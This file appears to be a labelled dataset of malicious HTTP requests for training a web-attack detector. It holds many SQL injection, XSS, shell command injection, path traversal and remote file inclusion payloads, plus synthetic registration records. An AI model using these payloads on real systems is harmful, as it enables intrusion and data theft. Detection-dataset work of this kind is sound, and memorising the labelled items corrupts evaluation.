sentences 	 labels
/ read & search & results ? words = nessus "  >  < script > alert (  ' listmanager_words_xss . nasl '  )  <  / script >  	 1
/ string & strings & parameters = 1 and 4241 = convert ( int ,  ( select char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  	 1
/ scripts & phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331908691 & lang_crm =  .  .  /  .  .  / vtigerservice . php \ x00  	 1
/ string & strings & parameters = |   [  6 -ne  $  ( echo tkxzex  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  &  &  	 1
/ string & str =  $  ( echo ycsciw )   str1 =  $  {  # str }   if  [  2 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  &  &  	 1
/ scripts & index . php ? p =  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ boot . ini \ x00  	 1
/ help . php ? q =  " del \ x09q83132484 & rem \ x09? q =  " del \ x09q83132484 & rem \ x09  	 1
/ scripts & news . scr . php ? globals [ pth ]  [ classes ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / moclyxlwqyfjnp ?  ?  	 1
/ string & strings & parameters = 1 "  "  and 6240 =  (  ' qqpjq '  |  |  ( select case 6240 when 6240 then 1 else 0 end from rdb $ database )  |  |  ' qzvzq '  )  	 1
/ string & strings & parameters = 1 %  "  "  or 5286 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  and  "  "  %  "  "  =  "  "  	 1
/ help . php ? q = ping ; -w ; 8000 ; -n ; 1 ; 1 . 2 . 3 . 4 & rem ;? q = ping ; -w ; 8000 ; -n ; 1 ; 1 . 2 . 3 . 4 & rem ;  	 1
/ string & strings & parameters = 1 '  ,  ( select  ( case when  ( 6560 = 2813 )  then 1 else cast ( 1 as int )  &  ( select 0 from dual )  end )  from dual )  	 1
/ string & strings & parameters = & echo $ ifsutudjc $  (  ( 16 + 78 )  )  $  ( echo $ ifsutudjc ) utudjc &  &  	 1
/  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  &  .  .  &  { file }  	 1
/ string & strings & parameters = &  sleep 0  &  &  str =  $  ( echo kigxdw )   &  &  str1 =  $  {  # str }   &  &   [  7 -eq  $  { str1 }   ]   &  &  sleep 1  &  	 1
/ files & message-forward . php3 ? bsx_libdir = xxpathxx  	 1
/ en-us & account & backend & classes . php ? include_path =  .  .  / lib / jinzora . js \ x00  	 1
/ string & strings & parameters = 1 '  )  )  )  union all select null , null --  	 1
/ cgi-bin & quickstore . cgi ? page =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00html & cart_id =  	 1
/ popup . php ? poll_ident =  < script > alert (  " wvs-xss-magic-string-411445575285 "  )  <  ? poll_ident =  < script > alert (  " wvs-xss-magic-string-411445575285 "  )  <  / script >  	 1
/ string & strings & parameters = &  # 34 ;  &  # 62 ;  < h1 & onmouseover =  '  \ u0061lert ( 1 )  '  >  	 1
/ string & strings & parameters = -3794 '  )  union all select 2485 , 2485 , 2485 , 2485 , 2485 --  	 1
/ string & strings & parameters = |   [  9 -ne  $  ( echo nykvkx  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  |  	 1
/ weq93ppb . php ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ string & strings & parameters = 1 %  "  "  )  )  or char ( 119 )  |  | char ( 100 )  |  | char ( 99 )  |  | char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 )  , 0 )  , 5000000000 )  , null )  --  	 1
/ string & strings & parameters = 1 )  )  as nwyh where 7100 = 7100 ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 & 2 )  )  )  )  --  	 1
/ usr & extensions & get_calendar . inc . php ? root_path = xxpathxx  	 1
/ cgis & pfdispaly . cgi ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ zuihld5m . exe ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ string & strings & parameters = -4557 or 6872 = 6872 --  kkte  	 1
/ en-us & hipkz026 . idc ?  < script > document . cookie =  " testyrbs = 2855 ;  "  <  / script >  	 1
/ string & strings & parameters = 1 "  "  )  as gdcx where 2335 = 2335 and 6969 =  ( select 6969 from pg_sleep ( 5 )  )  --  	 1
/ javascript & pm . exe  	 1
/ help . php ? q =  ; rm \ x09q81281166 \ x09 #? q =  ; rm \ x09q81281166 \ x09 #  	 1
/ string & strings & parameters = < script src =  " http :  &  # 47 ;  &  # 47 ; xss . rocks & xss . jpg "  >  <  & script >  	 1
/ string & strings & parameters = 1 %  '  and 7366 = 9197 #  	 1
/ rpxyx07v . asp ?  < script > document . cookie =  " testbnli = 1975 ;  "  <  ?  < script > document . cookie =  " testbnli = 1975 ;  "  <  / script >  	 1
/ string & strings & parameters = 1 %  '  )  )  ; begin user_lock . sleep ( 5 )  ;  end and  (  (  '  %  '  =  '  	 1
/ phpmyadmin & webappmon . exe ? ins = nowait & act = natping & sel =  " 255 . 255 . 255 . 255  &  id &  "  	 1
/ index . php & 1 '  	 1
/ string & strings & parameters = 1 )  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  else char ( 76 )  |  | char ( 65 )  |  | char ( 102 )  |  | char ( 72 )  end )  from  ( values ( 0 )  )  )  and  ( 5099 = 5099  	 1
/ edv3mapy . exe ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ r3le3om5 . dll ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ string & strings & parameters = -1059 "  "  )  union all select 1276 , 1276 , 1276 , 1276 , 1276 , 1276 , 1276 , 1276 #  	 1
/ d7ktpmcq . nsf ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ examples & jsp & colors & search . php ? allwords =  < br >  < script > foo <  / script >  & cid = 0 & title = 1 & desc = 1  	 1
/ phpmyadmin & index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 1358744507 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 --  	 1
/ string & strings & parameters = % oa ping -n 30 127 . 0 . 0 . 1  	 1
/ oie504mr . dll ?  < script > document . cookie =  " testtpby = 7052 ;  "  <  ?  < script > document . cookie =  " testtpby = 7052 ;  "  <  / script >  	 1
/ help . php ? q =  "  & rm \ xa0q59981564 & rem \ xa0? q =  "  & rm \ xa0q59981564 & rem \ xa0  	 1
/ string & strings & parameters = -4108 '  )  or 3440 = cast (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  )  |  |  ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end )  )  :  : text |  |  ( chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  as numeric )  and  (  ' tqjx '  =  ' tqjx  	 1
/ string & strings & parameters = |   [  9 -ne  $  ( echo wxfpfo  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  '  	 1
/ string & strings & parameters = 1 '  )  )  )  ; select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 and  (  (  (  ' ctbs '  like  ' ctbs  	 1
/ phpmyadmin & documentation . html ? phpmyadmin =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ string & strings & parameters = 1 %  '  )  ; select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 and  (  '  %  '  =  '  	 1
/ 5qnlm5z2 . jsp ?  < meta http-equiv = set-cookie content =  " testsixi = 8451 "  >?  < meta http-equiv = set-cookie content =  " testsixi = 8451 "  >  	 1
/ string & strings & parameters = select  *  from information_schema . tables --  	 1
/ string & modo = insertar & precio = 1885 +  & b1 = pasar + por + caja  	 1
/ string & strings & parameters = '   str =  $  ( echo giprgx )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  &  	 1
/ forum1_professionnel . asp ? n = 1771 & amp ; nn = 100 & amp ; page = c :  \ boot . ini? n = 1771 & amp ; nn = 100 & amp ; page = c :  \ boot . ini  	 1
/ main . php ? logout =  '  \ x0arm \ x09q55586739 \ x09 #? logout =  '  \ x0arm \ x09q55586739 \ x09 #  	 1
/ string & strings & parameters = 1 "  "  )  as kuuf where 6908 = 6908 ; if ( 7899 = 7899 )  select 7899 else drop function zbbp --  	 1
/ string & strings & parameters = 1 )  )  as krzi where 8727 = 8727 or 8315 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  --  	 1
/ string & strings & parameters = |  | echo ovbfoe $  (  ( 46 + 36 )  )  $  ( echo ovbfoe ) ovbfoe &  	 1
/ string & strings & parameters = "  | echo $ ifsytbsts $  (  ( 24 + 38 )  )  $  ( echo $ ifsytbsts ) ytbsts |  	 1
/ string & modoa = registro & login = puglia & password = ente + 6a7 & nombre = serveriana & apellidos = santander + bohorquez & email = rundle4 @ eurograb . ma & dni = 09116322l & direccion = calle + trebedes + 157 ,  +  & ciudad = fasnia & cp = 02270 & provincia = ciudad + real & ntc = 1078977887269273 & b1 = registrar  	 1
/ string & strings & parameters = ;  str =  $  ( echo msptmx )  ;  str1 =  $  {  # str }  ;  if  [  5 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  	 1
/ string & modo = entrar & login = rocio4 & pwd = acrecenta ! dora & remember = onany ?   set-cookie :  + tamper = 1041264011025374727 & b1 = entrar  	 1
/ javascript &  . passwd . o  	 1
/ string & strings & parameters = 1 ; call regexp_substring ( repeat ( right ( char ( 3702 )  , 0 )  , 500000000 )  , null )  #  huhw  	 1
/ string & strings & parameters = 1 '  |  |  ( select  ' kbvq '  where 9279 = 9279 and extractvalue ( 7982 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( elt ( 7982 = 7982 , 1 )  )  )  , 0x717a767a71 )  )  )  |  |  '  	 1
/ string & strings & parameters = &  & echo ncexjg $  (  ( 72 + 12 )  )  $  ( echo ncexjg ) ncexjg &  &  	 1
/ string & strings & parameters = ; echo $ ifsxltpvn $  (  ( 45 + 86 )  )  $  ( echo $ ifsxltpvn ) xltpvn \  	 1
/ examples & jsp & checkbox & index . php ? cat_select =  < script > foo <  / script >  	 1
/ javascript & 2004 . exe  	 1
/ string & strings & parameters = -6095 '  )  or 6872 = 6872 and  (  ' bfwm '  like  ' bfwm  	 1
/ string & strings & parameters = & lt ; script src =  &  & xss . rocks &  . j >  	 1
/ string & strings & parameters = < svg onclick = popup = 1 ;  >  	 1
/ string & strings & parameters = '   str =  $  ( echo jkjfeg )   str1 =  $  {  # str }   if  [  6 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  '  	 1
/ string & strings & parameters = '   str =  $  ( echo paacld )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  '  	 1
/ children ' s &  	 1
/ string & strings & parameters = |  | echo ihelyg $  (  ( 76 + 62 )  )  $  ( echo ihelyg ) ihelyg &  	 1
/ moodle & filter & tex & texed . php ? formdata = foo & pathname = foo "  +  |  |  + echo + db + 6f + 61 + 64 + 4c + 69 + 62 + 72 + 61 + 72 + 79 + 41 + 00 + 00 + 00 + 00 + 47 + 65 + 74 + 50 + 72 + 6f + 63 + 41 + 64 + 64 +  +  >  > ctdn  	 1
/ javascript & sessions . exe  	 1
/ scripts & mlog . html ? screen =  / etc / passwd  	 1
/ 7u1pb2xi . nsf ?  < script > document . cookie =  " testlwwz = 718 ;  "  <  ?  < script > document . cookie =  " testlwwz = 718 ;  "  <  / script >  	 1
/ string & strings & parameters = ;  str =  $  ( echo hdixth )  ;  str1 =  $  {  # str }  ;  if  [  5 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "  	 1
/ string & strings & parameters = 1 '  )  order by 1 --  	 1
/ cgi-bin & contrib & forms & evaluation & c_formevaluation . class . php ? fileroot =  / etc / passwd \ x00  	 1
/ bl8sefdm . pl ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ main . php ? stuff =  "  & ver \ x09 > q95961944 & rem \ x09? stuff =  "  & ver \ x09 > q95961944 & rem \ x09  	 1
/ string & strings & parameters = '  waitfor delay  ' 0 : 0 : 20 '   --  	 1
/ string & strings & parameters = '  ) print (  ` echo ehpkwp \ necho  $  (  ( 79 + 86 )  )  \ necho ehpkwp \ necho ehpkwp `  )  ;  &  & ehpkwp  	 1
/ string & strings & parameters = 1 "  "  where 8672 = 8672 union all select null , null #  	 1
/ string & strings & parameters = 1 "  "  )  as jiiq where 6847 = 6847 ; select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 --  	 1
/ scripts & kernel & loadkernel . php ? installpath =  / etc / passwd \ x00  	 1
/ javascript & surf . exe  	 1
/ string & strings & parameters = '  or  ' 1 '  =  ' 1 '  --  	 1
/ support & include & open_form . php ? include_dir = xxpathxx ? cmd = pwd  	 1
/ string & strings & parameters = 1 '  where 1272 = 1272 or 2633 = dbms_pipe . receive_message ( chr ( 112 )  |  | chr ( 65 )  |  | chr ( 65 )  |  | chr ( 103 )  , 5 )  --  	 1
/ string & modo = registro & login = fitch & password = libres29 & nombre = aramis & apellidos = bellmunt + callealt & email = frigola @ lesionesmusculares . tv +  & dni = 56967582d & direccion = plza .  + celso + negueruela ,  + 113 ,  +  & ciudad = pajares + de + los + oteros & cp = 18370 & provincia = lava & ntc = 6708069843609931 & b1 = registrar  	 1
/ fcgi-bin & a1stats & a1disp3 . cgi ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ string & strings & parameters = "  echo bzqfls $  (  ( 30 + 41 )  )  $  ( echo bzqfls ) bzqfls "  	 1
/ string & strings & parameters = '  ;  str =  $  ( echo zepyms )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  	 1
/ e9rx3ya4 . x ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ xoops232b & htdocs & xoops_lib & modules & protector & onupdate . php ? mydirname = a (  )  {  } system (  '  /  .  / tmp / rymojltfjq0 +  >  +  / dev / null +  &  '  )  ;  function v  	 1
/ string & strings & parameters = 1 %  "  "  waitfor delay  ' 0 : 0 : 5 '  --  	 1
/ string & strings & parameters = 1 %  "  "  or row ( 1045 , 7562 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 1045 = 1045 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and  "  "  %  "  "  =  "  "  	 1
/ string & strings & parameters = 1 %  '  )  )  )  and 3715 in  (  ( char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  and  (  (  (  '  %  '  =  '  	 1
/ index . php ? errcode =  < script > alert (  " 413375588092 "  )  ;  <  ? errcode =  < script > alert (  " 413375588092 "  )  ;  <  / script >  	 1
/ string & strings & parameters = 1 '  +  ( select pagd where 2484 = 2484 ; select  ( case when  ( 3855 = 3855 )  then 3855 else 1 &  ( select 0 )  end )  --  	 1
/ ssi & envout . bat ?  | dir  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  	 1
/ string & strings & parameters = ftp :  &  & 192 . 168 . 24 . 203 &  *  < apache_mod_proxy_ftp_glob_xss . nasl >  	 1
/ help . php ? q =  '  \ x0adel q56533456  #? q =  '  \ x0adel q56533456  #  	 1
/ gy23xnjq . jsp ?  < script > cross_site_scripting . nasl <  ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ string & strings & parameters = <  !  >  <  !  --  --  >  <  ?  >  <  /  >  	 1
/ top . php ? stuff =  '  ; uname  > q56884429  #? stuff =  '  ; uname  > q56884429  #  	 1
/ string & modo = registro & login = dongmoon & password = setentavo & nombre = naiara & apellidos = ballester + alumbreo & email = demjanenko @ gesautonomos . io & dni = 56050614m & direccion = c &  + colon + 123 ,  + 6 ? c & ciudad = cantalapiedra & cp = 43143 & provincia = lugo & ntca = 6967344603029050 & b1 = registrar  	 1
/ plugins & spamx & editheader . admin . class . php ? _conf [ path ]  = xxpathxx  	 1
/ recordings & index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 1161314398 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 --  	 1
/ string & strings & parameters = |   [  2 -ne  $  ( echo oiyjxa  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  &  	 1
/ examples & jsp & sessions & include & theme . inc . php ? fullpath =  / etc / passwd \ x00  	 1
/ string & strings & parameters = 1 "  "  )  )  )  and  ( 3020 = 3020 )  * 6703 and  (  (  (  "  " krxy "  "  =  "  " krxy  	 1
/ i7prbs22 . php ?  < script > document . cookie =  " testjnre = 7328 ;  "  <  ?  < script > document . cookie =  " testjnre = 7328 ;  "  <  / script >  	 1
/ cgi-bin & openview5 . exe ? target = main & action =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / windows / win . ini  	 1
/ string & strings & parameters = echo ymgfhg $  (  ( 56 + 20 )  )  $  ( echo ymgfhg ) ymgfhg &  	 1
/  % uff0e % uff0e \  % uff0e % uff0e \  { file }  	 1
/ string & strings & parameters = 1 '  )  )  or char ( 119 )  |  | char ( 100 )  |  | char ( 99 )  |  | char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 )  , 0 )  , 5000000000 )  , null )  --  	 1
/ examples & jsp & cal & awstatstotals . php ? sort =  "  ]  . phpinfo (  )  . exit (  )  .  $ a [  "  	 1
/ top . php ? stuff =  "  & rm q91375949 & rem? stuff =  "  & rm q91375949 & rem  	 1
/ string & strings & parameters = 1 where 6383 = 6383 or elt ( 6272 = 6272 , sleep ( 5 )  )  --  	 1
/ main . php ? logout =  "  \ x0asleep \ x0911 \ x09 #? logout =  "  \ x0asleep \ x0911 \ x09 #  	 1
/ accountlogon . cfm ? rtn = 1 "  >  < script > alert (  " 411735577546 "  )  ;  <  ? rtn = 1 "  >  < script > alert (  " 411735577546 "  )  ;  <  / script >  <  " 234  	 1
/ main . php ? logout =  '  & uname  #? logout =  '  & uname  #  	 1
/ string & modo = insertar & precio = 5289 & b1 = pasar + por + caja '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  	 1
/ 9ko6m4c8 . cfc ?  < meta http-equiv = set-cookie content =  " testylik = 3403 "  >?  < meta http-equiv = set-cookie content =  " testylik = 3403 "  >  	 1
/ main . php ? logout =  '  \ x0auname \ x09 #? logout =  '  \ x0auname \ x09 #  	 1
/ scs86g1p . pl ?  < meta http-equiv = set-cookie content =  " testquyx = 2820 "  >?  < meta http-equiv = set-cookie content =  " testquyx = 2820 "  >  	 1
/ examples & servlets & servlet & way-board & way-board . cgi ? db =  / etc / passwd \ x00  	 1
/ examples & jsp & cal & index . php ? search =  < script > foo <  / script >  	 1
/ examples & jsp & jsp2 & jspx & user . cgi ? url =  "  >  < script > alert (  " gossamer_links_url_xss . nasl "  )  ;  <  / script >  & from = add  	 1
/ string & strings & parameters = -4418 "  "  or 6872 = 6872 and  "  " gbut "  "  =  "  " gbut  	 1
/ string & strings & parameters = 1 %  '  or  ( select  *  from  ( select ( sleep ( 5 )  )  ) sddo )  #  	 1
/ string & strings & parameters = '  ; echo $ ifswzvyqz $  (  ( 68 + 9 )  )  $  ( echo $ ifswzvyqz ) wzvyqz |  	 1
/ m5103snj . kspx ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ string & strings & parameters = < x ng-focus = x =  $ event id = f tabindex = 0 >  < x ng-if =  [ 1 ]  . map ( x . view . alert )  >  	 1
/ h21y8w52 . pl ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
